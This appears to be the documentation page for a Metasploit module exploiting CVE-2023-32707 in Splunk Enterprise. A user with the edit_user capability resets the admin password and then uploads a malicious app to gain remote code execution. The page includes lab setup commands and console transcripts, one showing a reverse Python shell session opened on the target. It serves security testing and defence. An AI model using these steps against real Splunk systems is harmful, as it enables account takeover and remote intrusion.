## Vulnerable Application

### Description

An authorization issue within Splunk Enterprise allows any user with the edit_user capability to take over
the admin account (or any other chosen account) by simply changing its password.

On June 1, 2023, Splunk released a software update that addressed this vulnerability (CVE-2023-32707).

The following products are affected:

Splunk Enterprise:
 - from 8.1 before 8.1.14
 - from 8.2 before 8.2.11
 - from 9.0 before 9.0.5

Splunk Cloud Platform:
 - before 9.0.2303.100

### Exploitation

This module exploits this authorization issue to take over the admin account (or any other account with
the capability `install_apps`) to deploy an app within Splunk, aiming to achieve remote code execution.

To achieve that this module:
- Will change the password of the targeted user;
- Will deploy an app with a malicious payload;

After the execution the cleanup method will be called and:
- Should delete the deployed app;

### Setup

Create a Splunk's docker container with the following command:

```bash
    docker run --rm -p 8000:8000 -p 8089:8089 -e "SPLUNK_START_ARGS=--accept-license" -e "SPLUNK_PASSWORD=password" --name splunk-9.0.4 splunk/splunk:9.0.4
```

```bash
    # Creating non-admin user
    $ curl -k -u admin:password https://localhost:8089/services/authentication/users -d name=redway -d password=changeme -d roles=user -d createrole=1 -X POST
    # Adding capability to edit_user to the non-admin role
    $ curl -k -u admin:password https://localhost:8089/services/authorization/roles/user-redway -d capabilities=edit_user -X POST
```

**One must log in at least once on the web interface (http://localhost:8000). Otherwise, this module will fail to get the CSRF
token on the `appinstall`.**

## Verification Steps
Follow [Setup](#setup) and [Scenarios](#scenarios).

## Options

### USERNAME (required)

The username that with the capability `edit_user` to authenticate with.

### PASSWORD (required)

The password of the user to authenticate with.

### RHOSTS (required)

The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html

### RPORT (required)

The target port (TCP)

### TARGET_USER (required)

The username to change the password for (default: admin)

### TARGET_PASSWORD

The new password to set for the admin user (default: random)

### APP_NAME

The name of the app to upload (default: random)

## Scenarios

### Docker container running Splunk 9.0.4


If the user you have access doen't have the capability `edit_user` the module will fail as shown below:

```
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > check

[*] Splunk version 9.0.4 detected
[*] 127.0.0.1:8000 - The target is not exploitable. User 'redway' does not have 'edit_user' capability
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) >

```

If the targeted user does have the capability `install_apps` the module will fail as shown below:

```
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > exploit

[*] Started reverse TCP handler on 172.17.0.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Splunk version 9.0.4 detected
[+] The target appears to be vulnerable. User 'redway' has 'edit_user' capability
[*] Changing 'user' password to yMDIOKyrHoUx
[+] Password of the user 'user' has bee changed to yMDIOKyrHoUx
[-] Exploit aborted due to failure: bad-config: The user 'user' does not have 'install_app' capability. You may consider to target other user
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) >
```

```
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > options

Module options (exploit/multi/http/splunk_privilege_escalation_cve_2023_32707):

   Name             Current Setting      Required  Description
   ----             ---------------      --------  -----------
   APP_NAME                              no        The name of the app to upload (default: random)
   PASSWORD         changeme             yes       The password for the specified username
   Proxies          http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS           127.0.0.1            yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT            8000                 yes       The target port (TCP)
   SSL              false                no        Negotiate SSL/TLS for outgoing connections
   TARGET_PASSWORD                       no        The new password to set for the admin user (default: random)
   TARGET_USER      admin                yes       The username to change the password for (default: admin)
   USERNAME         redway               yes       The username with "edit_user" role to authenticate as
   VHOST                                 no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.17.0.1       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/sh          yes       The system shell to use


Exploit target:

   Id  Name
   --  ----
   0   Splunk <= 9.0.5, 8.2.11, and 8.1.14 / Linux



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > exploit

[*] Started reverse TCP handler on 172.17.0.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Splunk version 9.0.4 detected
[+] The target appears to be vulnerable. User 'redway' has 'edit_user' capability
[*] Changing 'admin' password to srviInIpi
[+] Password of the user 'admin' has bee changed to srviInIpi
[*] Uploading app stringtough
[*] Uploading file stringtough
[*] Creating an application package named: stringtough
[+] stringtough successfully uploaded
[*] Waiting for session
[*] Command shell session 1 opened (172.17.0.1:4444 -> 172.17.0.2:52672) at 2023-09-12 15:19:53 +0200

id
uid=41812(splunk) gid=41812(splunk) groups=41812(splunk),999(ansible)
pwd
/opt/splunk/etc/apps/stringtough/bin
exit
[*] 127.0.0.1 - Command shell session 1 closed.
```

### Docker container running Splunk 9.0.5

On a **non-vulnerable** version the module will fail as shown below:

```
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > exploit 

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. Detected Splunk version 9.0.5 which is not vulnerable ForceExploit is enabled, proceeding with exploitation.
[*] Changing 'admin' password to iDKBmVsj
[-] Exploit aborted due to failure: unexpected-reply: Unable to change admin's password.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > set ForceExploit true
ForceExploit => true
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > exploit 

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. Detected Splunk version 9.0.5 which is not vulnerable ForceExploit is enabled, proceeding with exploitation.
[*] Changing 'admin' password to scupUXtcV
[-] Exploit aborted due to failure: unexpected-reply: Unable to change admin's password.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/splunk_privilege_escalation_cve_2023_32707) > 
```
